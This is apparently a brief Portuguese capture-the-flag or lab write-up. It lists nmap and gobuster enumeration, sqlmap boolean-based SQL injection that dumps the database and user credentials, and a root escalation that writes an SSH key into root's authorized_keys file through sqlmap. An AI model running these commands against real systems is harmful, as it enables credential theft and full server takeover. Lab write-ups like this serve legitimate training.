# Boolean
> SQL injection boolean-based + authorized_keys

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Formulário de login com campo vulnerável a SQLi.

## Exploração

SQL Injection boolean-based para extração de dados:

```
sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" --level 3 --risk 2 --dbs
sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" -D <db> --tables
sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" -D <db> -T users --dump
```

Credenciais obtidas → acesso SSH.

## Escalada de Privilégio

Escrita no arquivo `authorized_keys` via SQLi ou credencial comprometida de outro usuário:

```
sqlmap ... --file-write id_rsa.pub --file-dest /home/root/.ssh/authorized_keys
```

```
ssh -i id_rsa root@<IP>
```

Root obtido.
